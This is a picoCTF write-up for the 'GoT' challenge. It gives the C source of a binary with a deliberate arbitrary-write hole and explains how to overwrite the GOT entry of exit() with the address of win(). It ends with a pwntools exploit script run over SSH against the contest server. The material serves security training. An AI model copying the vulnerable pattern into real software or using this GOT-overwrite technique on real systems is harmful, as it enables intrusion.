[Back](PicoFrontPage.md)

# GoT

### Source Code
```c
include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAG_BUFFER 128

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  puts(buf);
  fflush(stdout);
}


int *pointer;

int main(int argc, char *argv[])
{

   puts("You can just overwrite an address, what can you do?\n");
   puts("Input address\n");
   scanf("%d",&pointer);
   puts("Input value?\n");
   scanf("%d",pointer);
   puts("The following line should print the flag\n");
   exit(0);
}
```

### Analysis

This challenge is fairly simple - it asks for an address you want to override with a new one.
If we run `got` on a running program on `gdb` we can see the got table with all the libc functions.
We can see that `exit()` is at `0x0804a01c`. If we override `puts()` it won't actually print out the flag, so the only libc function that is available to us is `exit()`.
Basically we provide the address of `exit()` on the first round of input and on the second we provide the address of `win()`

```python
from pwn import *

s = ssh(host='2019shell1.picoctf.com', user='Username', password='Password')

p = s.process('/problems/got_4_97e6bb0e913c179989678416d8a8fb22/vuln', cwd='/problems/got_4_97e6bb0e913c179989678416d8a8fb22')

# variables
exit = 0x804a01c
win = 0x080485c6

# send payloads
p.recvuntil(b'Input address\n')
p.sendline(str(exit))

p.recvuntil(b'Input value?\n')
p.sendline(str(win)) # bytes dont work, p32(win) wont work

# pop shell
p.interactive()
```
